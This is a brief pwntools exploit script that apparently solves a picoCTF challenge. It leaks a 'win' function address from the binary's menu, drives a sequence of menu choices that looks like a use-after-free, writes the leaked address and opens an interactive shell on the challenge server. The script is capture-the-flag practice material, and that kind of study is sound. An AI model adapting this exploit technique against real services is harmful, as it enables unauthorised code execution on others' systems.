# user: 0x804b060

from pwn import * 

exe = ELF("./vuln")

context.binary = exe
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 4504)

    return r

def main():
	r = conn()
	input()

	r.sendlineafter(b'(e)xit\n', b's')
	r.recvuntil(b'leak...')
	win = int(r.recv(9).decode(), 16)
	info('Win address: ' + hex(win))
	r.sendlineafter(b'(e)xit\n', b'i')
	r.sendlineafter(b'?\n', b'Y')
	r.sendlineafter(b'(e)xit\n', b'l')
	r.sendlineafter(b':\n', p32(win))
	
	pause()
	r.interactive()
if __name__ == "__main__":
	main()